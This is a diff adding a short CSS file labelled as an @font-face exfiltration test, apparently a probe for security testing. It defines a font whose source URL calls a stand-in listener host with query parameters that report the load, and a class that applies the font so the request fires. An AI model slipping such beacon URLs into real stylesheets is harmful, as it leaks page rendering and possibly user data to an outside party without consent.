@@ -1,0 +1,15 @@
+/* CSS @font-face Exfiltration Test */
+@font-face {
+    font-family: 'BatchTestFont';
+    src: url('http://mock.listener/batch_css_font_exfil?font_family=BatchTestFont&trigger=font_load_attempt');
+}
+
+/* Example usage of the font to potentially trigger the load if not automatically loaded */
+body {
+    /* Applying to body might not always trigger if font is not used or preloaded. */
+    /* More reliable trigger is to apply to a visible element with text. */
+}
+.use-leaky-font-webdav { /* Specific class to apply the font */
+    font-family: 'BatchTestFont', sans-serif;
+    content: "Testing Leaky Font."; /* Ensure there's content */
+}
